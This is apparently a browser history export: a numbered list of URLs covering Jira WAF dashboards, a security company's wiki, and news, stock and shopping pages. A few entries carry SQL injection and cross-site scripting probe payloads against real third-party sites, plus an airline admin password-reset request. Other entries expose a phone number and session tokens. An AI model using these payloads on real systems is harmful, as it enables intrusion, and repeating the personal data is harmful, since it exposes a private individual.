&up_username=&url=http%3A%2F%2Fjira.ngwdev.com%2Frest%2Fgadgets%2F1.0%2Fg%2Fcom.atlassian.streams.streams-jira-plugin%3Aactivitystream-gadget%2Fgadgets%2Factivitystream-gadget.xml&libs=auth-refresh,395,0
http://jira.ngwdev.com/plugins/servlet/gadgets/ifr?container=atlassian&mid=10003&country=CN&lang=zh&view=default&view-params=%7B%22writable%22%3A%22false%22%7D&st=atlassian%3AeE26CriyrUr8lylsqCKWbrt%2BaK3QBG8PfxokUgiRJ67SGBW5TdkBijGXRJMBs5R4btmN03qKHYwJqma%2BpPBhskjS3x7j1r8TE02Zt3T%2FPgZZoSEVZfMUA1XBsjZawAoFqqM9WBdT9zc6T%2BzRaXfdQZ1ht0Q2p5fQhECN6lMaVMhRZIBCOOj1%2FisYMOo5m4qbZp6lnkxFum5Ku2sjOiuCENSoU8fWp9DlRMD3TmymzxdrdMIfc7JgSgcq1NeRlpwlzHO%2F0%2FLkTIPAq%2BmG6XLEYryeUwpnFRSpFAi6LQQQGpCJZNKPUqhmJRmgue7rT4qaP%2FGcyiBl9BaeqwH6ZRLkjcqy4H4%3D&up_isConfigured=true&up_isReallyConfigured=true&up_title=WAF&up_titleRequired=true&up_numofentries=5&up_refresh=15&up_maxProviderLabelCharacters=50&up_rules=%257B%2522providers%2522%253A%255B%257B%2522provider%2522%253A%2522streams%2522%252C%2522rules%2522%253A%255B%255D%252C%2522disabled%2522%253Atrue%257D%252C%257B%2522provider%2522%253A%2522git-commits-activity-stream-provider%2522%252C%2522rules%2522%253A%255B%255D%257D%252C%257B%2522provider%2522%253A%2522issues%2522%252C%2522rules%2522%253A%255B%255D%257D%255D%257D&up_renderingContext=&up_keys=&up_itemKeys=&up_username=&url=http%3A%2F%2Fjira.ngwdev.com%2Frest%2Fgadgets%2F1.0%2Fg%2Fcom.atlassian.streams.streams-jira-plugin%3Aactivitystream-gadget%2Fgadgets%2Factivitystream-gadget.xml&libs=auth-refresh,396,0
http://jira.ngwdev.com/plugins/servlet/gadgets/ifr?container=atlassian&mid=10003&country=CN&lang=zh&view=default&view-params=%7B%22writable%22%3A%22false%22%7D&st=atlassian%3Ai3f5FQa9PjN35CjIItlKzshUlwy4JBTvZo25pu1WUWn7PxPZ0%2FgsQQQY6OkFnxIbdy%2F8GGv1%2FAgzNV6mEVl9X4cNZrtk3rSEfoEq0SYBjdGbwrAJx3CcuYSc3zSLQsEKikJ2AngxNEbY23GV4J3gxl5DWpA8NSEtp71D3E7pFuBq6IJQKWOmGLwaKqXC0RNKNnjaxaH5ajdgmrTQSZyFoSQGcfhPzzbAxNJp5cwuLcoROaqY9BKsQnZ8F5fHVkAkudRmEWzh4OlCLMlvhLXDMRqNGdcVJVu%2BPtmsxWLWJJAYIL6z4y%2FAHbyjIr3ep8QvR3DH%2FZkLtnyWYEdfqTjpamJGPAs%3D&up_isConfigured=true&up_isReallyConfigured=true&up_title=WAF&up_titleRequired=true&up_numofentries=5&up_refresh=15&up_maxProviderLabelCharacters=50&up_rules=%257B%2522providers%2522%253A%255B%257B%2522provider%2522%253A%2522streams%2522%252C%2522rules%2522%253A%255B%255D%252C%2522disabled%2522%253Atrue%257D%252C%257B%2522provider%2522%253A%2522git-commits-activity-stream-provider%2522%252C%2522rules%2522%253A%255B%255D%257D%252C%257B%2522provider%2522%253A%2522issues%2522%252C%2522rules%2522%253A%255B%255D%257D%255D%257D&up_renderingContext=&up_keys=&up_itemKeys=&up_username=&url=http%3A%2F%2Fjira.ngwdev.com%2Frest%2Fgadgets%2F1.0%2Fg%2Fcom.atlassian.streams.streams-jira-plugin%3Aactivitystream-gadget%2Fgadgets%2Factivitystream-gadget.xml&libs=auth-refresh,397,0
http://jira.ngwdev.com/plugins/servlet/gadgets/ifr?container=atlassian&mid=10003&country=CN&lang=zh&view=default&view-params=%7B%22writable%22%3A%22false%22%7D&st=atlassian%3An6T119pAvkTIsh50N9qA8YmTwxGs09ca8V8Qm46Cbs43b%2Bx%2F%2FtFsXEH9kVuOa25mvBd%2FfEj%2Ft70zqH810ofH9M56cYAXvZSyxLINtgSJQfLG%2B12nSTUowpeQazF0nSBWGRfb5SmQqGctnYCurNefswFrJexbqT8xIFEhhzRPXYBPKGDedxma5MDyUufheTlUdKDe3r4PfTUGf7GVaBvsUt6mhQ4aXhPTHUtVADmhZQpuhrSdmugOCIuZRehuNYvH%2BujniAol3D7%2FeyQPoRSsNJJ8IpWJ4g768xby8j%2Bf%2BWvtuq8CThuu6gAssyAT8xBfTMoWD%2FeY3851n6GyAgcJ6ATwakQ%3D&up_isConfigured=true&up_isReallyConfigured=true&up_title=WAF&up_titleRequired=true&up_numofentries=5&up_refresh=15&up_maxProviderLabelCharacters=50&up_rules=%257B%2522providers%2522%253A%255B%257B%2522provider%2522%253A%2522streams%2522%252C%2522rules%2522%253A%255B%255D%252C%2522disabled%2522%253Atrue%257D%252C%257B%2522provider%2522%253A%2522git-commits-activity-stream-provider%2522%252C%2522rules%2522%253A%255B%255D%257D%252C%257B%2522provider%2522%253A%2522issues%2522%252C%2522rules%2522%253A%255B%255D%257D%255D%257D&up_renderingContext=&up_keys=&up_itemKeys=&up_username=&url=http%3A%2F%2Fjira.ngwdev.com%2Frest%2Fgadgets%2F1.0%2Fg%2Fcom.atlassian.streams.streams-jira-plugin%3Aactivitystream-gadget%2Fgadgets%2Factivitystream-gadget.xml&libs=auth-refresh,398,0
http://jira.ngwdev.com/plugins/servlet/gadgets/ifr?container=atlassian&mid=10003&country=CN&lang=zh&view=default&view-params=%7B%22writable%22%3A%22false%22%7D&st=atlassian%3AsANs3cTcNurkzTGcbx1D7j6czHHdAEjeE8clpSq58qPJbHoMtF0rg7J%2BZ5KwrsAKDhUya6I1bfgPQJ6t%2Fq%2FWQtaq0ExGyrYvySN4ghg7P%2F7BniDq8pvU4NYmvXsJhRZiTs78MDXzeyxGXpYPdYGWmLgI0n4dm4MsH4ei5DVfaPwFKBVv1iKu8o7j35cUEkwBve2ns8PCu17tbKlbVIMXDBmFpmAlMidftM8%2FwzCE8lkCnd1lyBLZAv%2FCLOxdtBuw7MMUnrqLvP8iOIkfdjHba%2BQQ1LdxgnxJEzh4qEXXt4XZeDqqHG93DbO3JkB%2BIQClyku2BHcACRttGFLmNGdK0rUT2yg%3D&up_isConfigured=true&up_isReallyConfigured=true&up_title=WAF&up_titleRequired=true&up_numofentries=5&up_refresh=15&up_maxProviderLabelCharacters=50&up_rules=%257B%2522providers%2522%253A%255B%257B%2522provider%2522%253A%2522streams%2522%252C%2522rules%2522%253A%255B%255D%252C%2522disabled%2522%253Atrue%257D%252C%257B%2522provider%2522%253A%2522git-commits-activity-stream-provider%2522%252C%2522rules%2522%253A%255B%255D%257D%252C%257B%2522provider%2522%253A%2522issues%2522%252C%2522rules%2522%253A%255B%255D%257D%255D%257D&up_renderingContext=&up_keys=&up_itemKeys=&up_username=&url=http%3A%2F%2Fjira.ngwdev.com%2Frest%2Fgadgets%2F1.0%2Fg%2Fcom.atlassian.streams.streams-jira-plugin%3Aactivitystream-gadget%2Fgadgets%2Factivitystream-gadget.xml&libs=auth-refresh,399,0
http://jira.ngwdev.com/plugins/servlet/gadgets/ifr?container=atlassian&mid=10205&country=CN&lang=zh&view=default&view-params=%7B%22writable%22%3A%22true%22%7D&st=atlassian%3A6mfbnflL%2FDX33m%2B9Y86J5UMJo%2FrK%2Bn8J7vpt%2Bbj3%2FzEudJ6cGjyn47nibnWdKVaat4f8tiaDrfpx3U%2F%2FilTrhMP4ew8jeu1DI4wY9yV3rOZrFL9SWKvt9z%2FmV4CUJcv%2B97tE643ptz9fvk%2BoTxdN4vEHvF330pD5NrTOjt%2FXiDIkb9tVfgHl1Yu4%2BNGO1%2FdVWydPLHPFXwCAFwD5enCTsgGHxJXVSi7ah3AXJWeaE%2FdGXfKE4sMAaiMo8AoPE9Y1ZJkYw2MSKudeoR%2FmfKN%2F0S7m%2BAUXGekd6CeHR29uWW4npdpLdaqViLvEGACtXzt8R%2BMhGw%3D%3D&up_isConfigured=true&up_isReallyConfigured=true&up_title=WAF&up_titleRequired=true&up_numofentries=5&up_refresh=15&up_maxProviderLabelCharacters=50&up_rules=%257B%2522providers%2522%253A%255B%257B%2522provider%2522%253A%2522streams%2522%252C%2522rules%2522%253A%255B%255D%252C%2522disabled%2522%253Atrue%257D%252C%257B%2522provider%2522%253A%2522git-commits-activity-stream-provider%2522%252C%2522rules%2522%253A%255B%255D%257D%252C%257B%2522provider%2522%253A%2522issues%2522%252C%2522rules%2522%253A%255B%255D%257D%255D%257D&up_renderingContext=&up_keys=&up_itemKeys=&up_username=&url=http%3A%2F%2Fjira.ngwdev.com%2Frest%2Fgadgets%2F1.0%2Fg%2Fcom.atlassian.streams.streams-jira-plugin%3Aactivitystream-gadget%2Fgadgets%2Factivitystream-gadget.xml&libs=auth-refresh,400,0
http://jira.ngwdev.com/plugins/servlet/gadgets/ifr?container=atlassian&mid=10205&country=CN&lang=zh&view=default&view-params=%7B%22writable%22%3A%22true%22%7D&st=atlassian%3ASy0NZQm8dggqm16O%2Fg4UXKnYdVvP2W1zZQlIpmaHABaYnbcOqclZ6Aqibq2b85O2ezollJqvqDop9vYQ2fev3dh%2BPmcOC%2B79uMMojEyqd%2BtxIkiLE7lCJ1wPYv9T16Aq2heQRQTjOlOPhm7VuLebaqdy2xUsRy%2FbiigE0CYg7f8hk9F4dka3VuctUWq5ingAROZxymmoHy8L3jBNv%2F%2BdeFV3RKloe%2BYJ1h5nX0Zc%2F98Bw%2FxVOKVKnJOBgBMBbJ6vc6WjcrmCqlYkch%2BRwQWiW53GETZD4GJNbWVnWTbjwEFwIQpt6F%2F4ixQ0aFwS%2FBLnilQFlw%3D%3D&up_isConfigured=true&up_isReallyConfigured=true&up_title=WAF&up_titleRequired=true&up_numofentries=5&up_refresh=15&up_maxProviderLabelCharacters=50&up_rules=%257B%2522providers%2522%253A%255B%257B%2522provider%2522%253A%2522streams%2522%252C%2522rules%2522%253A%255B%255D%252C%2522disabled%2522%253Atrue%257D%252C%257B%2522provider%2522%253A%2522git-commits-activity-stream-provider%2522%252C%2522rules%2522%253A%255B%255D%257D%252C%257B%2522provider%2522%253A%2522issues%2522%252C%2522rules%2522%253A%255B%255D%257D%255D%257D&up_renderingContext=&up_keys=&up_itemKeys=&up_username=&url=http%3A%2F%2Fjira.ngwdev.com%2Frest%2Fgadgets%2F1.0%2Fg%2Fcom.atlassian.streams.streams-jira-plugin%3Aactivitystream-gadget%2Fgadgets%2Factivitystream-gadget.xml&libs=auth-refresh,401,0
http://jira.ngwdev.com/projects/WAF/issues/WAF-427?filter=allopenissues,402,0
http://jira.ngwdev.com/projects/WAF/summary,403,0
http://jira.ngwdev.com/secure/Dashboard.jspa,404,0
http://k.sina.com.cn/article_1912964267_720584ab02000mboj.html?from=news&subch=onews,405,0
http://kaihua-h5-frontend.antivirus-ncov.dev.wochanye.com/activity/add,406,0
http://kaihua-h5-frontend.antivirus-ncov.dev.wochanye.com/activity/checkDetail/61,407,0
http://kaihua-h5-frontend.antivirus-ncov.dev.wochanye.com/activity/kakouSelect,408,0
http://kaihua-h5-frontend.antivirus-ncov.dev.wochanye.com/activity/list,409,0
http://lagignition.blog.163.com/blog/static/12873002320109135292479/,410,0
http://live.vhall.com/572867870,411,0
"http://localhost/otcms/news/?list_refer-content-union%20select%201,2,3.html",412,0
http://localhost:8088/backup,413,0
http://localhost:8088/company,414,0
http://localhost:8094/,415,0
http://localhost:8094/fangyi?name=12589&cityId=194&cityName=%E6%9D%AD%E5%B7%9E%E5%B8%82&provinceId=96,416,0
http://localhost:8094/newhome,417,0
http://m.116wx.com/read/101/101275/45527259.html,418,0
"http://m.baidu.com/from=1000953c/ssid=0/s?word=%E5%AD%A6%E6%A0%A1%E6%B0%B4%E7%94%B5%E7%BB%B4%E4%BF%AE%E5%B7%A5%E6%8B%9B%E8%81%98&sa=re_dl_prs_34689_1&rqid=10756492727568937665&rq=%E6%9D%AD%E5%B7%9E%E5%B8%82%E7%BB%BC%E5%90%88%E7%BB%B4%E4%BF%AE%E5%B7%A5%E6%8B%9B%E8%81%98&rsf=53040014&asctag=72945&ssid=0&from=1000953c&uid=0&pu=usm@3,sz@320_1002,ta@iphone_2_5.1_2_5.3&bd_page_type=1&baiduid=D87B49E01982D06CE49C5AE564927015&tj=9Xx_5_0_10_lNaN",419,0
http://m.baidu.com/s?from=1000953c&word=%E6%9D%AD%E5%B7%9E%E5%B8%82%E7%BB%BC%E5%90%88%E7%BB%B4%E4%BF%AE%E5%B7%A5%E6%8B%9B%E8%81%98,420,0
http://m.baidu.com/s?from=1000953c&word=58%E5%90%8C%E5%9F%8E%E7%BB%BC%E5%90%88%E7%BB%B4%E4%BF%AE%E7%94%B5%E5%B7%A5,421,0
http://m.baidu.com/s?from=1269a&word=%E5%BE%AE%E4%BF%A1,422,0
http://m.dianping.com/shop/110859340/review_all,423,0
http://m.gmw.cn/uctt/202002/25/1300982562.html?from=uctt_news&zzd_from=uc-iflow&sm_article_id=1103102783423176227&dl_type=3&uc_biz_str=S%3Acustom%7CC%3Aiflow_wm2&rd_type=reco&recoid=5655091319633353066&sp_gz=3&cid=100&app=uc-iflow&activity=1&activity2=1,424,0
http://mail.sichuanair.com/?q=base,425,0
http://mainsoft.info.*.com.cn/qm/bug/bugAction.do?action=doBugBf&fromDetail=false&functionID=Bug&id=39382,426,0
http://mainsoft.info.*.com.cn/qm/bug/bugAction.do?action=doBugBf&fromDetail=false&functionID=Bug&id=40154,427,0
http://mainsoft.info.*.com.cn/qm/bug/bugAction.do?action=doBugBf&fromDetail=false&functionID=Bug&id=43280,428,0
http://mainsoft.info.*.com.cn/qm/bug/bugAction.do?action=doBugBf&fromDetail=false&functionID=PersonalBug_all&id=42976,429,0
http://manager.websaas.cn/monitor/template,430,0
http://manager.websaas.cn/operate-tool/misinform,431,0
http://manager.websaas.cn/protect/configureSite,432,0
http://manager.websaas.cn/protect/newSite?contract_id=,433,0
http://mars3d.cn/forcesium/tutorials/Cesium-Workshop/index.html,434,0
http://masinvest.mas.gov.cn/?keywords=1&all=0,435,0
http://mini.cpc.sogou.com/artemis/test_sirius.html?pid=sogou_weimenghu_brandmini&mid=403988&rtype=2,436,0
http://mini.flash.2144.com/20181113/count.html,437,0
http://mini.flash.2144.com/20190806/mini-h-200110144623/index.html?_category_id=8&_plan_id=180&_content_id=422&_material_id=0&tt=156265658701&_times=2,438,0
http://mini.flash.2144.com/20190806/mini-h-200110144623/index.html?_category_id=8&_plan_id=180&_content_id=422&_material_id=0&tt=156265658701&_times=2&_opentype=bootup,439,0
http://mini.flash.2144.com/20190806/mini-h-200110144623/index.html?_category_id=8&_plan_id=180&_content_id=422&_material_id=0&tt=156265658701&_times=2&_opentype=minitaskscheduler,440,0
http://mini.flash.2144.com/20190806/mini-main-200110084749/index.html?_category_id=7&_plan_id=63&_content_id=414&_material_id=0&tt=156265658701&_times=1,441,0
http://mini.flash.2144.com/20190806/mini-main-200110084749/index.html?_category_id=7&_plan_id=63&_content_id=414&_material_id=0&tt=156265658701&_times=1&_opentype=bootup,442,0
http://mini.flash.2144.com/20190806/mini-main-200110084749/index.html?_category_id=7&_plan_id=63&_content_id=414&_material_id=0&tt=156265658701&_times=1&_opentype=minitaskscheduler,443,0
http://mini.flash.2144.com/20191210/mini-game-200108183550/index.html?_category_id=7&_plan_id=178&_content_id=410&_material_id=0&tt=156265658701&_times=1,444,0
http://mini.flash.2144.com/20191210/mini-game-200108183550/index.html?_category_id=7&_plan_id=178&_content_id=410&_material_id=0&tt=156265658701&_times=1&_opentype=bootup,445,0
http://mini.flash.2144.com/20191210/mini-game-200222150458/index.html?_category_id=7&_plan_id=178&_content_id=410&_material_id=0&tt=156265658701&_times=1&_opentype=bootup,446,0
http://mini.flash.2144.com/20191210/mini-game-200222150458/index.html?_category_id=7&_plan_id=178&_content_id=410&_material_id=0&tt=156265658701&_times=1&_opentype=minitaskscheduler,447,0
http://mogu.jdbbx.com/PlugInfo.aspx?id=207,448,0
http://music.163.com/di,449,0
http://mydbfx.com/?p=12521,450,0
http://myhome.dangdang.com/myOrder,451,0
http://myidushe.zuopinj.com/11337/299412.html,452,0
http://news.163.com/,453,0
http://news.163.com/19/0328/13/EBBV8MGD000189DG.html,454,0
http://news.163.com/photoview/00AN0001/2306876.html,455,0
http://news.sina.com.cn/c/2020-02-25/doc-iimxyqvz5595464.shtml,456,0
http://news.sina.com.cn/ts/2020-02-02/doc-iimxxste8270575.shtml,457,0
http://news.sina.com.cn/ts/2020-02-13/doc-iimxxstf1098958.shtml,458,0
http://news.sina.com.cn/w/2020-02-25/doc-iimxyqvz5572082.shtml,459,0
http://news.sina.com.cn/w/2020-02-26/doc-iimxxstf4409149.shtml,460,0
http://pan.qun.qq.com/clt_filetab/groupShareClientNew.html,461,0
http://pc.xunlei.com/pages/,462,0
http://phpgg.otcms.org/ads.php?adWebTitle=%E6%90%9C%E7%B4%A2%28%E6%AD%A3%E6%96%87%29%EF%BC%9Aunion+select+123_%E7%BD%91%E9%92%9BCMS%28OTCMS%29+PHP%E7%89%88+V5.xx&adDate=20191101&adID=12&adBox=true,463,0
http://phpgg.otcms.org/ads.php?adWebTitle=%E6%90%9C%E7%B4%A2%28%E6%AD%A3%E6%96%87%29%EF%BC%9Aunion+select+123_%E7%BD%91%E9%92%9BCMS%28OTCMS%29+PHP%E7%89%88+V5.xx&adDate=20191101&adID=21&adBox=true,464,0
http://pingan.websaas.cn/zentao/index.php?m=bug&f=create&productID=16&branch=0&extra=moduleID=0,465,0
http://popup.sohu.com/v2?sfsw=000&g=0.*,466,0
http://popup.sohu.com/v2?sfsw=001&g=0.*,467,0
http://pos.baidu.com/cccm?conwid=300&conhei=250&rdid=5526127&dc=3&exps=110011&psi=38a39e56411c148c8a9eeda405f5d2db&di=u5526127&dri=0&dis=0&dai=6&ps=3595x959&enu=encoding&ant=0&dcb=___adblockplus_&dtm=HTML_POST&dvi=0.0&dci=-1&dpt=none&tsr=0&tpr=1582593517135&ti=%E5%8D%8E%E4%B8%BAMateXs%E4%B8%8A%E6%89%8B%E8%AF%84%E6%B5%8B&ari=2&ver=0214&dbv=2&drs=3&pcs=1519x754&pss=1519x13704&cfv=0&cpl=3&chi=1&cce=true&cec=GBK&tlm=1582593518&rw=754&ltu=http%3A%2F%2Fmobile.zol.com.cn%2F738%2F7387593.html%3Ffrom%3Dbd&ltr=https%3A%2F%2Fwww.baidu.com%2Flink%3Furl%3DbU3OyUEYcsUQWGBGkCn4NuJHzk3CFDAvQ2K__I4oW5EYP3xmN3GMhFsJByZD1cWbogkAs3wIslRspAA9b-wuaa%26wd%3D%26eqid%3Decc6fb900015cdc2000000045e5475e6&lcr=https%3A%2F%2Fwww.baidu.com%2Flink%3Furl%3DbU3OyUEYcsUQWGBGkCn4NuJHzk3CFDAvQ2K__I4oW5EYP3xmN3GMhFsJByZD1cWbogkAs3wIslRspAA9b-wuaa%26wd%3D%26eqid%3Decc6fb900015cdc2000000045e5475e6&ecd=1&uc=1536x824&pis=-1x-1&sr=1536x864&tcn=1582593518&qn=b1b16be32daefc41&tt=1582593518080.38.346.*,468,0
http://pos.baidu.com/jcnm?conwid=300&conhei=250&rdid=4396777&dc=3&exps=110011&psi=24a7bf49af4d6f7380cdd2bf0f058b23&di=u4396777&dri=1&dis=0&dai=7&ps=100x0&enu=encoding&ant=0&dcb=___adblockplus_&dtm=HTML_POST&dvi=0.0&dci=-1&dpt=none&tsr=0&tpr=1581996434732&ti=%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92Maze-%E7%AB%99%E9%95%BF%&ari=2&ver=0214&dbv=2&drs=1&pcs=1263x597&pss=1263x2161&cfv=0&cpl=21&chi=1&cce=true&cec=UTF-8&tlm=1581996435&rw=597&ltu=http%3A%2F%2Fwww.chinaz.com%2Ftags%2FlesuobingduMaze.shtml&ltr=https%3A%2F%2Fwww.baidu.com%2Flink%3Furl%3DHAzHddk8hUb3cnDMnrFgDJg_gboAU_tZmH2-MuTEk_1z-LP6leb6vV6f8G1MSH-NG9ChXald_RTEr0wVkWqSpq%26wd%3D%26eqid%3D96478d0e00443599000000045e4b55d8&lcr=https%3A%2F%2Fwww.baidu.com%2Flink%3Furl%3DHAzHddk8hUb3cnDMnrFgDJg_gboAU_tZmH2-MuTEk_1z-LP6leb6vV6f8G1MSH-NG9ChXald_RTEr0wVkWqSpq%26wd%3D%26eqid%3D96478d0e00443599000000045e4b55d8&ecd=1&uc=1280x690&pis=-1x-1&sr=1280x720&tcn=1581996436&qn=244565ea6eac9458&tt=1581996435370.330.388.*,469,0
http://pos.baidu.com/lcim?conwid=300&conhei=250&rdid=4178566&dc=3&exps=110011&psi=b7027ae588c44fa6616ec4f010b23a54&di=u4178566&dri=0&dis=0&dai=4&ps=403x1032&enu=encoding&ant=0&dcb=___adblockplus_&dtm=HTML_POST&dvi=0.0&dci=-1&dpt=none&tsr=0&tpr=1582599044040&ti=%E6%9D%AD%E5%B7%9E%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5%2C%E6&ari=2&ver=0214&dbv=2&drs=1&pcs=1664x919&pss=1664x4130&cfv=0&cpl=3&chi=1&cce=true&cec=UTF-8&tlm=1582599045&rw=919&ltu=http%3A%2F%2Fwww.weather.com.cn%2Fweather%2F101210101.shtml%237d&ltr=https%3A%2F%2Fwww.baidu.com%2Flink%3Furl%3DbxR-KBfgnm5kA_1klId-VU6RwBiY9WpK3_vMdYMJod9Bfy2MuO2jD8YfFvZJrB2It7wIMp7VXUaxdFzk4eVdGK%26wd%3D%26eqid%3Df07dca680004dc7c000000045e548b73&lcr=https%3A%2F%2Fwww.baidu.com%2Flink%3Furl%3DbxR-KBfgnm5kA_1klId-VU6RwBiY9WpK3_vMdYMJod9Bfy2MuO2jD8YfFvZJrB2It7wIMp7VXUaxdFzk4eVdGK%26wd%3D%26eqid%3Df07dca680004dc7c000000045e548b73&ecd=1&uc=1680x1022&pis=-1x-1&sr=1680x1050&tcn=1582599045&qn=a2c32fae0c6d408e&tt=1582599043917.1526.1526.*,470,0
http://product.dangdang.com/27941047.html,471,0
http://product.dangdang.com/28507437.html,472,0
http://product.yesky.com/product/966/966727/,473,0
http://pss-system.cnipa.gov.cn/sipopublicsearch/portal/uiIndex.shtml,474,0
http://px.tcnet.com.cn/,475,0
http://px.tcnet.com.cn/partner/,476,0
http://px.tcnet.com.cn/partner/1298.html,477,0
http://q.sto.cn/service/customerservice,478,0
http://qinfo.clt.qq.com/qinfo_v3/setting.html,479,0
http://qqclient.qq.com,480,0
http://quote.eastmoney.com/concept/sz300033.html?from=classic,481,0
http://quote.eastmoney.com/hk/08083.html?from=BaiduAladdin,482,0
http://quote.eastmoney.com/kcb/688090.html,483,0
http://quote.eastmoney.com/kcb/688158.html,484,0
http://quote.eastmoney.com/sh600487.html?from=BaiduAladdin,485,0
http://quote.eastmoney.com/sh603005.html?from=BaiduAladdin,486,0
http://quote.eastmoney.com/sz000545.html?from=BaiduAladdin,487,0
http://quote.eastmoney.com/sz000623.html,488,0
http://quote.eastmoney.com/sz002050.html?from=BaiduAladdin,489,0
http://quote.eastmoney.com/sz002185.html?from=BaiduAladdin,490,0
http://quote.eastmoney.com/sz300030.html?from=BaiduAladdin,491,0
http://quote.eastmoney.com/sz300160.html?from=BaiduAladdin,492,0
http://quote.eastmoney.com/sz300322.html?from=BaiduAladdin,493,0
http://quote.eastmoney.com/sz300454.html?from=BaiduAladdin,494,0
http://quote.eastmoney.com/sz300750.html,495,0
http://quote.eastmoney.com/zhuti/subject/a13,496,0
http://qzonestyle.gtimg.cn/,497,0
http://render-ant.9game.cn/p/q/2a07bb2c82/portal.html?ch=LN_322&ng_ch=KM_47726&lch=VN_767&bd_vid=12181130403775038868,498,0
http://rtecoahzsa.img.2332cq.com/EA95DF-E1DD93-id-82268-src-1-num-1.html?6ED48B=59&C57D50=pps,499,0
http://sdk50.tz.xididianqi.com/?m=vod-play-id-37176-src-1-num-1.html,500,0
http://sdk75.tz.xididianqi.com/?m=vod-play-id-103962-src-1-num-1.html,501,0
http://search.dangdang.com/?key=ansible&act=input,502,0
http://search.dangdang.com/?key=ansible&act=input&sort_type=sort_sale_amt_desc,503,0
http://search.dangdang.com/?key=cdn&act=input,504,0
http://search.dangdang.com/?key=cdn&act=input&sort_type=sort_sale_amt_desc,505,0
http://search.dangdang.com/?key=nginx&act=input,506,0
http://search.dangdang.com/?key=saltstack&act=input,507,0
http://search.jd.com/Search?keyword=%E4%BC%9F%E5%A4%A7%E7%9A%84%E6%80%9D%E6%83%B3%E5%AE%B6&enc=utf-8&qrst=1&rt=1&stop=1&vt=2&wq=%E9%9D%9E%E7%90%86%E6%80%A7%E7%9A%84%E8%AF%B1%E6%83%91&wtype=1&click=1,508,0
http://shbj.leshan.gov.cn/New/SpList.aspx?SName=&SNo=&SArea=%22);alert(56505)//,509,0
http://sky.163.com/m/,510,0
http://so.eastmoney.com/quotation/s?keyword=%E5%AE%81%E5%BE%B7%E6%97%B6%E4%BB%A3,511,0
http://so.eastmoney.com/web/s?keyword=%E4%B8%AD%E5%9B%BD%E4%BA%BA%E5%AF%BF&pageindex=1,512,0
http://so.eastmoney.com/web/s?keyword=%E4%BC%98%E5%88%BB%E5%BE%97,513,0
http://so.eastmoney.com/web/s?keyword=000623,514,0
http://soft.yesky.com/219/987815219.shtml,515,0
http://ssp.sichuanair.com/self-service/common/resetPassword,516,0
http://ssp.sichuanair.com/self-service/common/resetPasswordStepTwo?check=username&contents=admin&verifyCode=rgtg,517,0
http://status.renren.com/status/v7/452443775,518,0
http://stock.eastmoney.com/a/202002251395548761.html,519,0
http://support.dun.163.com/documents/2017091902?docId=71681359828144128&locale=zh-cn,520,0
http://sywooden.com/,521,0
http://szmdqa.org/zcfg.asp?i=1&kk=7%27%3E%3Cscript%3Eprompt(39027)%3C/script%3E,522,0
http://tech.163.com/,523,0
http://tech.163.com/photoview/0AI20009/17036.html,524,0
http://tech.sina.com.cn/csj/2020-02-25/doc-iimxxstf4165100.shtml,525,0
http://temai.m.suning.com/wap/spesell/brandcomm_100210039.html,526,0
http://testme.com/cgi-bin/Addfile?atid=18235&ishtml=1&init=1&inmenu=1,527,0
http://tieba.baidu.com/p/5048042578,528,0
http://tieba.baidu.com/p/5185831237?traceid=,529,0
http://tieba.baidu.com/p/5778170322?red_tag=c1457117108,530,0
http://tieba.baidu.com/p/6014740966?traceid=,531,0
http://tieba.baidu.com/p/6096523679?red_tag=n0177789979,532,0
http://tieba.baidu.com/p/6146110952?traceid=,533,0
http://tieba.baidu.com/p/6353050104?red_tag=b1441719068,534,0
http://tieba.baidu.com/p/6393630629?traceid=,535,0
http://tieba.baidu.com/p/6511098711?red_tag=c1262325575,536,0
http://tmc.118114.cn/vip/login.jsp,537,0
http://tv.sohu.com/mptv/index.shtml,538,0
http://v.baidu.com/,539,0
http://vip.wps.cn/,540,0
http://vip.wps.cn/home,541,0
http://wan.sogou.com/static/wmh/wmh_sy.html,542,0
http://wap.sogou.com/web/searchList.jsp?pg=webSearchList&eqs=ie6pGgD9RzOddWTyTpSJBFJFUkpK%2BuNkuj1lzifO%2Fk8T4q0egIAoJTXlolSeAL2CETauHHMFHVEwCZ0OPDdCaTBzKc4hJe8foM8QIG9GrHm3oYxcBqwev5gGAMPo%2BCjStHi8%2BLy%2Ft98epv54nXQD8bPZa7WPEy1b0GgIfS%2FXSK0xkRB9eDJdwVW3vaKMdC9ent0%2BZEb4ZgMg7fm1XmmmYnnLxNRliEsCM0RwyQzyuuP%2FVw8IfOJjDal878cmy2AO3lK0Ds8x9kSP%2BgIGx0Bon%2BukxAsOxwqmqHEcgIp1pNzqbrhSqWXCbGSqJYf8%2BxVA4S44o43Ipfp1AzQOBgyTyCtF5YGEoZ%2FthQqnSyhPcQfM2zGGJppbBaCFoOpoOjaaZtfeMyNXI7THJB5bF7TcUFNRA2l5M%2FRvBUtuPjPy3qYAHzfMN3sC9VyqnIX%2F3KogfH3TWwACLS9Kdmbnpxn7Q5fUKfqMvP2iVjnghG8L7j%2FVIdu9zEyBomoo%2BW3kX2AMJAVLrW3u9KKV2RbknzOp0FCyZk7ru6XW%2BDWp%2BDk2I3nSnLofhNDvtOt2SQDK3Q4M%2BBzCUqURnUkwxYffKyry7g%3D%3D,543,0
http://wap.zj.10086.cn/szhy/business/20191127quan/index.html?cf=1001&phone=13735434610&session=MSMWI5G92869MW5WZD83X3N5&nonce=9Uy5x71zRf5KM4b4&encpn=8129c643120e42375102e4ec5c01b9fb&num=13735434610&version=3.6.*,544,0
http://war.163.com/,545,0
http://war.163.com/photoview/4T8E0001/2307000.html,546,0
http://war.163.com/photoview/4T8E0001/2307005.html,547,0
http://weixin.qq.com/?version=385878573&time=1582693983,548,0
http://weixin.sogou.com/weixin?query=%E6%B3%B0%E5%9B%BD%E5%B0%8F%E6%B0%B4&ie=utf8&type=2&sourceid=weixinvr,549,0
http://wiki.das-security.cn/,550,0
http://wiki.das-security.cn/collector/pages.action?key=scan,551,0
http://wiki.das-security.cn/display/EDR/EDR,552,0
http://wiki.das-security.cn/display/zionlab/Agent+Tesla,553,0
http://wiki.das-security.cn/pages/resumedraft.action?draftId=2960119&draftShareId=6a0c7319-6581-4125-9664-0a5df0325c57&,554,0
http://wiki.das-security.cn/pages/resumedraft.action?draftId=2960842&draftShareId=a2eb30ae-3ac0-4b3e-bbd8-0871a24b75df&,555,0
http://wiki.das-security.cn/pages/resumedraft.action?draftId=2960845&draftShareId=3ed664ef-fd73-4b90-a7eb-d2b1c827d50b&,556,0
http://wiki.das-security.cn/pages/viewpage.action?pageId=1278003,557,0
